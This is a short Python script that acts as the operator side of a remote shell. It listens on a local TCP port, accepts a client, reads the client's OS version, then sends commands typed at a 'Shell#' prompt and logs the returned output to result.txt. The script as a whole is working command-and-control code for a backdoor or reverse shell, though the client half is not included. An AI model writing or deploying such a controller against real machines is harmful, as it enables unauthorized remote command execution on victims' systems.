import socket

s = socket.socket(2, 1)

s.bind(("localhost", 5645))
s.listen(5)

print("connected to port", 5645,"\n")

c, addre = s.accept()
print("connected to address", addre, "\n")

while True:
    os_version = c.recv(1024).decode()
    print("\n\nClient OS version is ",os_version,"\n")
    choose = input("for get remote please enter 's' and for exit please enter 'q': ")
    if choose == 's':
        input_r = input("Shell# ")
        c.sendall(input_r.encode())
        result = c.recv(1024).decode()
        print(result)
        f = open("\\result.txt","a")
        f.write(result)
        f.close()
    elif choose == 'q':
        break
    else:
        print("your input is wrong")
        c.sendall("c".encode())

s.close()